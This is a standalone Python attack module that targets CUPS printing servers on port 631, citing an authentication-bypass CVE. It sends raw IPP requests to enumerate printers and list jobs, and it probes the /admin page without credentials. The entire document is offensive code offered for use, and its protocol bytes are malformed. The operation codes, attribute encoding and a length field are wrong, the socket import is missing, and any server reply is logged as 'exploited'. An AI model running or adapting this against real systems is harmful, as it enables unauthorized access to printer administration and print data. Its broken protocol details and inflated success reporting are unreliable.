def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    Exploits CUPS (Common Unix Printing System) authentication bypass and information disclosure on IPP services.
    Targets: CUPS servers running on port 631 (IPP/HTTP).
    Vulnerability: CUPS authentication bypass (CVE-2020-8822 and related) allowing unauthenticated access to
    printer administration, job listing, and configuration. Also exploits information disclosure via IPP
    Get-Printer-Attributes and HTTP admin interface enumeration.
    Conditions: Works on CUPS versions prior to 2.3.3 (pre-fix), where certain IPP operations bypass
    authentication checks, and where the /admin HTTP interface lacks proper access controls.
    """
    try:
        results = {"enumeration": [], "admin_access": False, "printers": [], "jobs": []}
        
        # IPP Get-Printer-Attributes request (unauthenticated enumeration)
        ipp_request = (
            b'\x00\x01'  # version 1.1
            b'\x01'     # operation Get-Printer-Attributes
            b'\x00\x00'  # request-id
            b'\x03\x01'  # attributes-charset: utf-8
            b'\x03\x14'  # attributes-natural-language: en-us
            b'\x01\x21'  # printer-uri (tag)
            b'\x00\x23'  # length
            b'ipp://localhost/ipp/print'
            b'\x05'      # end-of-attributes
        )
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(ipp_request)
        response = sock.recv(4096)
        sock.close()
        
        if response:
            results["enumeration"].append("IPP service responded to unauthenticated request")
            # Extract printer URI and version from response
            if b'printer-uri-supported' in response:
                results["enumeration"].append("Printer URI disclosed")
            if b'printer-make-and-model' in response:
                results["enumeration"].append("Printer model disclosed")
        
        # Try HTTP admin interface access
        admin_url = f"http://{host}:{port}/admin"
        try:
            import urllib.request
            req = urllib.request.Request(admin_url, method='GET')
            resp = urllib.request.urlopen(req, timeout=timeout)
            if resp.status == 200:
                results["admin_access"] = True
                results["data"] = {"ipp_enumeration": results["enumeration"], "admin_interface": "accessible"}
                results["evidence"] = "CUPS admin interface accessible without authentication"
                return {"success": True, "data": results, "evidence": results["evidence"]}
        except Exception:
            pass
        
        # Try IPP with crafted request for job listing
        job_request = (
            b'\x00\x01'  # version 1.1
            b'\x03'     # operation Get-Jobs
            b'\x00\x00'  # request-id
            b'\x03\x01'  # attributes-charset: utf-8
            b'\x03\x14'  # attributes-natural-language: en-us
            b'\x01\x21'  # printer-uri
            b'\x00\x23'  # length
            b'ipp://localhost/ipp/print'
            b'\x05'      # end-of-attributes
        )
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(job_request)
        job_response = sock.recv(4096)
        sock.close()
        
        if job_response and b'jobs' in job_response:
            results["jobs"].append("Unauthenticated job listing successful")
        
        if results["enumeration"] or results["jobs"]:
            results["data"] = results
            results["evidence"] = "IPP service exploited: " + "; ".join(results["enumeration"] + results["jobs"])
            return {"success": True, "data": results, "evidence": results["evidence"]}
        
        return {"success": False, "data": "", "evidence": ""}
        
    except Exception as e:
        return {"success": False, "data": "", "evidence": str(e)}